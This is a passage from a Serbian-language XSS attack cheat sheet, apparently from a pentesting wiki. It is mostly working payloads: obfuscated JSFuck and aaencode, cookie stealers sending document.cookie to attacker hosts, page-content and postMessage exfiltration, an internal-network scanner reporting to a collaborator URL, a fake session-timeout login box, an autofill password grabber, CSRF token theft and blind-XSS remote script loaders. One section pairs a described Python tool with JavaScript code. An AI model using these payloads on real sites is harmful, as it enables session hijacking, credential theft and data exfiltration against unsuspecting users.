+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]]]+[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]])()</script>
```

```javascript
//aaencode
ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ ['_']; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) ['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\"';(ﾟДﾟ) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟΘﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) ('_');
```

```javascript
// It's also possible to execute JS code only with the chars: []`+!${}
```
## XSS uobičajeni payloadi

### Više payloada u jednom

{% content-ref url="steal-info-js.md" %}
[steal-info-js.md](steal-info-js.md)
{% endcontent-ref %}

### Preuzimanje kolačića
```javascript
<img src=x onerror=this.src="http://<YOUR_SERVER_IP>/?c="+document.cookie>
<img src=x onerror="location.href='http://<YOUR_SERVER_IP>/?c='+ document.cookie">
<script>new Image().src="http://<IP>/?c="+encodeURI(document.cookie);</script>
<script>new Audio().src="http://<IP>/?c="+escape(document.cookie);</script>
<script>location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.write('<img src="http://<YOUR_SERVER_IP>?c='+document.cookie+'" />')</script>
<script>window.location.assign('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['assign']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['href']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>document.location=["http://<YOUR_SERVER_IP>?c",document.cookie].join()</script>
<script>var i=new Image();i.src="http://<YOUR_SERVER_IP>/?c="+document.cookie</script>
<script>window.location="https://<SERVER_IP>/?c=".concat(document.cookie)</script>
<script>var xhttp=new XMLHttpRequest();xhttp.open("GET", "http://<SERVER_IP>/?c="%2Bdocument.cookie, true);xhttp.send();</script>
<script>eval(atob('ZG9jdW1lbnQud3JpdGUoIjxpbWcgc3JjPSdodHRwczovLzxTRVJWRVJfSVA+P2M9IisgZG9jdW1lbnQuY29va2llICsiJyAvPiIp'));</script>
<script>fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net', {method: 'POST', mode: 'no-cors', body:document.cookie});</script>
<script>navigator.sendBeacon('https://ssrftest.com/x/AAAAA',document.cookie)</script>
```
{% hint style="info" %}
Ako je postavljena zastava HTTPOnly u kolačiću, **nećete moći pristupiti kolačićima iz JavaScripta**. Ali evo [nekih načina za zaobilaženje ove zaštite](../hacking-with-cookies/#httponly) ako imate sreće.
{% endhint %}

### Ukradi sadržaj stranice
```javascript
var url = "http://10.10.10.25:8000/vac/a1fbf2d1-7c3f-48d2-b0c3-a205e54e09e8";
var attacker = "http://10.10.14.8/exfil";
var xhr  = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == XMLHttpRequest.DONE) {
fetch(attacker + "?" + encodeURI(btoa(xhr.responseText)))
}
}
xhr.open('GET', url, true);
xhr.send(null);
```
### Pronalaženje internih IP adresa

Da biste pronašli interne IP adrese, možete koristiti nekoliko tehničkih metoda:

1. **DNS Reverse Lookup**: Izvršite reverznu DNS pretragu za domen kako biste dobili povezane IP adrese. Na primer, koristite naredbu `nslookup` ili `dig` za izvršavanje reverzne DNS pretrage.

2. **ARP Cache**: Pregledajte keš ARP tabele na vašem računaru kako biste pronašli interne IP adrese. Možete koristiti naredbu `arp -a` na Windows operativnom sistemu ili `arp -n` na Linux operativnom sistemu.

3. **Ping Scan**: Izvršite ping skeniranje unutar mreže kako biste otkrili aktivne IP adrese. Na primer, koristite naredbu `ping` sa odgovarajućim opsegom IP adresa.

4. **Port Scan**: Izvršite skeniranje otvorenih portova na ciljnoj mreži kako biste pronašli aktivne IP adrese. Možete koristiti alate poput Nmap-a za izvršavanje port skeniranja.

Važno je napomenuti da je otkrivanje internih IP adresa u tuđoj mreži bez odobrenja vlasnika mreže ilegalno. Uvek se pridržavajte etičkih smernica i zakona prilikom izvođenja ovih tehnika.
```html
<script>
var q = []
var collaboratorURL = 'http://5ntrut4mpce548i2yppn9jk1fsli97.burpcollaborator.net';
var wait = 2000
var n_threads = 51

// Prepare the fetchUrl functions to access all the possible
for(i=1;i<=255;i++){
q.push(
function(url){
return function(){
fetchUrl(url, wait);
}
}('http://192.168.0.'+i+':8080'));
}

// Launch n_threads threads that are going to be calling fetchUrl until there is no more functions in q
for(i=1; i<=n_threads; i++){
if(q.length) q.shift()();
}

function fetchUrl(url, wait){
console.log(url)
var controller = new AbortController(), signal = controller.signal;
fetch(url, {signal}).then(r=>r.text().then(text=>
{
location = collaboratorURL + '?ip='+url.replace(/^http:\/\//,'')+'&code='+encodeURIComponent(text)+'&'+Date.now()
}
))
.catch(e => {
if(!String(e).includes("The user aborted a request") && q.length) {
q.shift()();
}
});

setTimeout(x=>{
controller.abort();
if(q.length) {
q.shift()();
}
}, wait);
}
</script>
```
### Port Skener (fetch)

Ovaj alat koristi `fetch` funkciju za skeniranje otvorenih portova na ciljnom serveru. Funkcija `fetch` se koristi za slanje HTTP zahteva serveru i dobijanje odgovora. U ovom slučaju, koristimo `fetch` za slanje zahteva na određene portove i proveru da li je port otvoren ili zatvoren.

```javascript
const target = 'example.com';
const ports = [80, 443, 8080];

async function scanPort(port) {
  try {
    const response = await fetch(`http://${target}:${port}`);
    console.log(`Port ${port} is open`);
  } catch (error) {
    console.log(`Port ${port} is closed`);
  }
}

async function scanPorts() {
  for (const port of ports) {
    await scanPort(port);
  }
}

scanPorts();
```

Da biste koristili ovaj alat, samo promenite vrednosti `target` i `ports` promenljivih prema vašim potrebama. `target` treba da bude adresa ciljnog servera, a `ports` treba da bude niz brojeva koji predstavljaju portove koje želite da skenirate.

Napomena: Ovaj alat koristi JavaScript i može se izvršavati samo u okruženjima koja podržavaju `fetch` funkciju, kao što su veb pregledači ili Node.js sa instaliranim `node-fetch` modulom.
```javascript
const checkPort = (port) => { fetch(http://localhost:${port}, { mode: "no-cors" }).then(() => { let img = document.createElement("img"); img.src = http://attacker.com/ping?port=${port}; }); } for(let i=0; i<1000; i++) { checkPort(i); }
```
### Port Skener (websockets)

Ovaj alat koristi websockets za skeniranje otvorenih portova na ciljanoj mašini. Websockets omogućavaju dvosmernu komunikaciju između klijenta i servera, što omogućava brže i efikasnije skeniranje portova.

#### Korišćenje

Da biste koristili ovaj alat, prvo morate instalirati `websocket-client` biblioteku. Možete je instalirati pomoću sledeće komande:

```
pip install websocket-client
```

Zatim pokrenite skriptu `port_scanner_websockets.py` sa ciljnom IP adresom i opsegom portova koje želite da skenirate. Na primer:

```
python port_scanner_websockets.py --target 192.168.0.1 --ports 1-1000
```

Ovaj primer će skenirati portove od 1 do 1000 na IP adresi 192.168.0.1.

#### Napomena

Budite pažljivi prilikom korišćenja ovog alata. Skeniranje portova bez dozvole vlasnika ciljane mašine može biti ilegalno. Uvek se pridržavajte zakona i etičkih smernica prilikom izvođenja bilo kakvih aktivnosti vezanih za hakovanje.
```python
var ports = [80, 443, 445, 554, 3306, 3690, 1234];
for(var i=0; i<ports.length; i++) {
var s = new WebSocket("wss://192.168.1.1:" + ports[i]);
s.start = performance.now();
s.port = ports[i];
s.onerror = function() {
console.log("Port " + this.port + ": " + (performance.now() -this.start) + " ms");
};
s.onopen = function() {
console.log("Port " + this.port+ ": " + (performance.now() -this.start) + " ms");
};
}
```
_Kratka vremena ukazuju na odgovarajući port_ _Duža vremena ukazuju na nedostatak odgovora._

Pregledajte listu zabranjenih portova u Chrome-u [**ovde**](https://src.chromium.org/viewvc/chrome/trunk/src/net/base/net\_util.cc) i u Firefox-u [**ovde**](https://www-archive.mozilla.org/projects/netlib/portbanning#portlist).

### Polje za unos akreditacija
```markup
<style>::placeholder { color:white; }</style><script>document.write("<div style='position:absolute;top:100px;left:250px;width:400px;background-color:white;height:230px;padding:15px;border-radius:10px;color:black'><form action='https://example.com/'><p>Your sesion has timed out, please login again:</p><input style='width:100%;' type='text' placeholder='Username' /><input style='width: 100%' type='password' placeholder='Password'/><input type='submit' value='Login'></form><p><i>This login box is presented using XSS as a proof-of-concept</i></p></div>")</script>
```
### Snimanje automatskog popunjavanja lozinki

Kada korisnik koristi funkciju automatskog popunjavanja lozinki u svom pregledaču, može se iskoristiti ova funkcionalnost za snimanje lozinki. Ovo je posebno korisno u napadima na Cross-Site Scripting (XSS).

Da biste iskoristili ovu ranjivost, možete ubaciti skriptu koja će se izvršiti kada se stranica učita. Ova skripta može preuzeti vrednosti unetih lozinki i poslati ih na udaljeni server.

Da biste to postigli, možete koristiti HTML elemente kao što su `<input>` i `<textarea>` kako biste prikupili unete vrednosti. Zatim, koristite JavaScript da biste preuzeli te vrednosti i poslali ih na udaljeni server.

Važno je napomenuti da je ova tehnika efikasna samo ako korisnik ima automatsko popunjavanje lozinki omogućeno u svom pregledaču. Takođe, treba imati na umu da je ovo neetička aktivnost i može biti protivzakonita.
```javascript
<b>Username:</><br>
<input name=username id=username>
<b>Password:</><br>
<input type=password name=password onchange="if(this.value.length)fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```
Kada se unese bilo koji podatak u polje za lozinku, korisničko ime i lozinka se šalju na server napadača, čak i ako klijent izabere sačuvanu lozinku i ne unese ništa, podaci će biti izvučeni.

### Keylogger

Samo pretraživanjem na github-u pronašao sam nekoliko različitih:

* [https://github.com/JohnHoder/Javascript-Keylogger](https://github.com/JohnHoder/Javascript-Keylogger)
* [https://github.com/rajeshmajumdar/keylogger](https://github.com/rajeshmajumdar/keylogger)
* [https://github.com/hakanonymos/JavascriptKeylogger](https://github.com/hakanonymos/JavascriptKeylogger)
* Takođe možete koristiti metasploit `http_javascript_keylogger`

### Krađa CSRF tokena
```javascript
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/email',true);
req.send();
function handleResponse() {
var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
var changeReq = new XMLHttpRequest();
changeReq.open('post', '/email/change-email', true);
changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```
### Krađa PostMessage poruka

U nekim slučajevima, XSS napadač može iskoristiti PostMessage API kako bi krao poruke koje se šalju između različitih prozora ili iframe-ova na istoj domeni. Ova tehnika se naziva "stealing PostMessage messages" (krađa PostMessage poruka).

Da bi izveo ovaj napad, napadač mora ubaciti zlonamerni skriptu na ciljanoj stranici koja će presresti PostMessage poruke. Zatim, napadač može preuzeti sadržaj poruka i proslediti ga na svoj server ili ga koristiti u druge zlonamerne svrhe.

Da bi se zaštitili od ovog napada, preporučuje se korišćenje sigurnosnih mehanizama kao što su provera izvora poruka ili korišćenje kriptografije za enkripciju poruka koje se šalju putem PostMessage API-ja. Takođe je važno redovno ažurirati softver i primenjivati najnovije sigurnosne zakrpe kako bi se smanjio rizik od ovakvih napada.
```markup
<img src="https://attacker.com/?" id=message>
<script>
window.onmessage = function(e){
document.getElementById("message").src += "&"+e.data;
</script>
```
### Zloupotreba servisnih radnika

{% content-ref url="abusing-service-workers.md" %}
[abusing-service-workers.md](abusing-service-workers.md)
{% endcontent-ref %}

### Pristupanje Shadow DOM-u

{% content-ref url="shadow-dom.md" %}
[shadow-dom.md](shadow-dom.md)
{% endcontent-ref %}

### Poligloti

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xss_polyglots.txt" %}

### Slepi XSS payloadi

Možete takođe koristiti: [https://xsshunter.com/](https://xsshunter.com)
```markup
"><img src='//domain/xss'>
"><script src="//domain/xss.js"></script>
><a href="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">Click Me For An Awesome Time</a>
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//0mnb1tlfl5x4u55yfb57dmwsajgd42.burpcollaborator.net/scriptb");a.send();</script>

<!-- html5sec - Self-executing focus event via autofocus: -->
"><input onfocus="eval('d=document; _ = d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')" autofocus>

<!-- html5sec - JavaScript execution via iframe and onload -->
"><iframe onload="eval('d=document; _=d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')">

<!-- html5sec - SVG tags allow code to be executed with onload without any other elements. -->
"><svg onload="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')" xmlns="http://www.w3.org/2000/svg"></svg>

<!-- html5sec -  allow error handlers in <SOURCE> tags if encapsulated by a <VIDEO> tag. The same works for <AUDIO> tags  -->
"><video><source onerror="eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">

<!--  html5sec - eventhandler -  element fires an "onpageshow" event without user interaction on all modern browsers. This can be abused to bypass blacklists as the event is not very well known.  -->
"><body onpageshow="eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">

<!-- xsshunter.com - Sites that use JQuery -->
<script>$.getScript("//domain")</script>

<!-- xsshunter.com - When <script> is filtered -->
"><img src=x id=payload&#61;&#61; onerror=eval(atob(this.id))>

<!-- xsshunter.com - Bypassing poorly designed systems with autofocus -->
"><input onfocus=eval(atob(this.id)) id=payload&#61;&#61; autofocus>

<!-- noscript trick -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

<!-- whitelisted CDNs in CSP -->
"><script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.1/angular.min.js"></script>
<!-- ... add more CDNs, you'll get WARNING: Tried to load angular more than once if multiple load. but that does not matter you'll get a HTTP interaction/exfiltration :-]... -->
<div ng-app ng-csp><textarea autofocus ng-focus="d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='//localhost/mH/'"></textarea></div>
```
### Regex - Pristup skrivenom sadržaju

Iz [**ovog članka**](https://blog.arkark.dev/2022/11/18/seccon-en/#web-piyosay) je moguće saznati da čak i ako neke vrednosti nestanu iz JS-a, i dalje je moguće pronaći ih u JS atributima u različitim objektima. Na primer, unos REGEX-a je i dalje moguće pronaći nakon što je vrednost unosa REGEX-a uklonjena:
```javascript
// Do regex with flag
flag="CTF{FLAG}"
re=/./g
re.test(flag);

// Remove flag value, nobody will be able to get it, right?
flag=""

// Access previous regex input
console.log(RegExp.input)
console.log(RegExp.rightContext)
console.log(document.all["0"]["ownerDocument"]["defaultView"]["RegExp"]["rightContext"])
```
### Brute-Force Lista

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xss.txt" %}

## Zloupotreba drugih ranjivosti putem XSS-a

### XSS u Markdown-u

Možete ubaciti Markdown kod koji će biti prikazan? Možda možete dobiti XSS! Proverite:

{% content-ref url="xss-in-markdown.md" %}
[xss-in-markdown.md](xss-in-markdown.md)
{% endcontent-ref %}

### XSS u SSRF-u

Imate XSS na **sajtu koji koristi keširanje**? Pokušajte **nadograditi to u SSRF** putem ubacivanja Edge Side Include Injection sa ovim payloadom:
```python
<esi:include src="http://yoursite.com/capture" />
```
Koristite ga da zaobiđete restrikcije kolačića, XSS filtere i mnogo više!\
Više informacija o ovoj tehnici možete pronaći ovde: [**XSLT**](../xslt-server-side-injection-extensible-stylesheet-language-transformations.md).

### XSS u dinamički kreiranom PDF-u

Ako web stranica kreira PDF koristeći korisnički unos, možete pokušati da **prevarite robota** koji kreira PDF da **izvrši proizvoljni JS kod**.\
Dakle, ako **PDF kreator robot pronađe** neke vrste **HTML** **tagova**, on će ih **interpretirati**, a vi možete **zloupotrebiti** ovaj ponašanje da izazovete **Server XSS**.

{% content-ref url="server-side-xss-dynamic-pdf.md" %}
[server-side-xss-dynamic-pdf.md](server-side-xss-dynamic-pdf.md)
{% endcontent-ref %}

Ako ne možete ubaciti HTML tagove, vredi pokušati da **ubacite PDF podatke**:

{% content-ref url="pdf-injection.md" %}
[pdf-injection.md](pdf-injection.md)
{% endcontent-ref %}

### XSS u Amp4Email-u

AMP, koji ima za cilj ubrzanje performansi web stranica na mobilnim uređajima, uključuje HTML tagove koji su dopunjeni JavaScript-om kako bi se osigurala funkcionalnost sa naglaskom na brzinu i sigurnost. Podržava niz komponenti za različite funkcionalnosti, dostupnih putem [AMP komponenti](https://amp.dev/documentation/components/?format=websites).

Format [**AMP za Email**](https://amp.dev/documentation/guides-and-tutorials/learn/email-spec/amp-email-format/) proširuje određene AMP komponente na e-poštu, omogućavajući primaocima da direktno interaguju sa sadržajem unutar svoje e-pošte.

Primer [**writeup XSS u Amp4Email-u u Gmail-u**](https://adico.me/post/xss-in-gmail-s-amp4email).

### XSS otpremanje fajlova (svg)

Otpremite fajl kao sliku kao što je sledeći (sa [http://ghostlulz.com/xss-svg/](http://ghostlulz.com/xss-svg/)):
```markup
Content-Type: multipart/form-data; boundary=---------------------------232181429808
Content-Length: 574
-----------------------------232181429808
Content-Disposition: form-data; name="img"; filename="img.svg"
Content-Type: image/svg+xml

<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
<script type="text/javascript">
alert(1);
</script>
</svg>
-----------------------------232181429808--
```

```markup
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<script type="text/javascript">alert("XSS")</script>
</svg>
```

```markup
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
<script type="text/javascript">
alert("XSS");
</script>
</svg>
```

```svg
<svg width="500" height="500"
xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<circle cx="50" cy="50" r="45" fill="green"
id="foo"/>

<foreignObject width="500" height="500">
<iframe xmlns="http://www.w3.org/1999/xhtml" src="data:text/html,&lt;body&gt;&lt;script&gt;document.body.style.background=&quot;red&quot;&lt;/script&gt;hi&lt;/body&gt;" width="400" height="250"/>
<iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:document.write('hi');" width="400" height="250"/>
</foreignObject>
</svg>
```

```html
<svg><use href="//portswigger-labs.net/use_element/upload.php#x"/></svg>
```

```xml
<svg><use href="data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg' &gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x" />
```
Pronađite **više SVG payloada** na [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)

## Razne JS trikove i relevantne informacije

{% content-ref url="other-js-tricks.md" %}
[other-js-tricks.md](other-js-tricks.md)
{% endcontent-ref %}

## XSS resursi

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection)
* [http://www.xss-payloads.com](http://www.xss-payloads.com) [https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt](https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt) [https://github.com/materaj/xss-list](https://github.com/materaj/xss-list)
* [https://github.com/ismailtasdelen/xss-payload-list](https://github.com/ismailtasdelen/xss-payload-list)
* [https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec](https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec)
* [https://netsec.expert/2020/02/01/xss-in-2020.html](https://netsec.expert/2020/02/01/xss-in-2020.html)


<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
